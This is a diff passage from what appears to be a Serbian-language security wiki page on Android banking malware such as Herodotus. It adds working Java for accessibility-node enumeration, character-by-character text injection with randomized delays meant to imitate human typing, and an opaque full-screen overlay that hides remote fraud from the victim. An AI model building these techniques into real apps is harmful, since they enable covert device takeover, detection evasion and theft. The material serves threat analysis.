+// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
+void discover(AccessibilityNodeInfo r, List<String> out){
+if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
+CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
+out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
+r.getClassName(), id, txt, cd, b.toShortString()));
+for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
+}
+
+// Mode 1: progressively set text with randomized 300–3000 ms delays
+void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
+String cur = "";
+for (char c: s.toCharArray()){
+cur += c; Bundle b=new Bundle();
+b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
+field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
+Thread.sleep(300 + new java.util.Random().nextInt(2701));
+}
+}
+
+// Mode 2: clipboard + paste per-char with randomized delays
+void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
+field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
+ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
+for (char c: s.toCharArray()){
+cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
+field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
+Thread.sleep(300 + new java.util.Random().nextInt(2701));
+}
+}
+```
+</details>
+
+Overlay-i koji blokiraju za prikrivanje prevare:
+- Prikazati preko celog ekrana `TYPE_ACCESSIBILITY_OVERLAY` sa opacitetom pod kontrolom operatora; držati ga neprozirnim za žrtvu dok daljinska automatizacija radi ispod.
+- Tipično izložene komande: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.
+
+Minimal overlay sa podesivim alpha:
+```java
+View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
+WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
+MATCH_PARENT, MATCH_PARENT,
+WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
+WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
+WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
+PixelFormat.TRANSLUCENT);
+wm.addView(v, lp);
+```
+Primitivi kontrole operatora koji se često viđaju: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (screen sharing).
 
 ## References
+
+- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)
 
 - [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
 - [Luban – Android image compression library](https://github.com/Curzibn/Luban)
